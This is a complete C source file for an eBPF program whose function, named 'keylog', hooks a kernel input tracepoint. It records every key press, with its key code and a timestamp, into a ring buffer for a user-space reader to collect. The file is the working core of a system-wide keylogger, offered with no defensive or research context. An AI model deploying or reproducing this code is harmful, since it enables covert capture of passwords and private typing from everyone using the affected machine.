#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

#define EV_KEY 0x01

struct key_event {
    __u32 code;
    __s32 value;
    __u64 ns;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 4096);
} events SEC(".maps");

struct input_event_args {
    __u64 pad;
    __u32 _unused;
    __u32 type;
    __u32 code;
    __s32 value;
};

SEC("tracepoint/input/input__event")
int keylog(struct input_event_args *ctx)
{
    if (ctx->type != EV_KEY) return 0;
    if (ctx->value != 1)     return 0;

    struct key_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;

    e->code  = ctx->code;
    e->value = ctx->value;
    e->ns    = bpf_ktime_get_ns();

    bpf_ringbuf_submit(e, 0);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
